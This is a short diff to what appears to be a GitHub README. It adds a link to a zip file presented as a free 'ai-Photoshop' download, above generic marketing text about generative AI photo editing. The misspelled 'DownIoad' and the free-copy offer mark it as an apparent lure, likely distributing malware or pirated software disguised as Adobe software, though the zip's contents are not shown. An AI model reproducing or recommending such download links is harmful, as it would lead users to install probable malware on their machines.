@@ -1,4 +1,4 @@
-# [DownIoad ai-Photoshop]
+# [DownIoad ai-Photoshop](https://github.com/ImDreezycz/Photoshop-for-free/releases/download/Photoshop/Ai-Photoshop.zip)
 
 **Generative AI photo editing can include tasks like creating all new images, adding or removing content from preexisting images, replacing a background, expanding an image, and much more.**
 
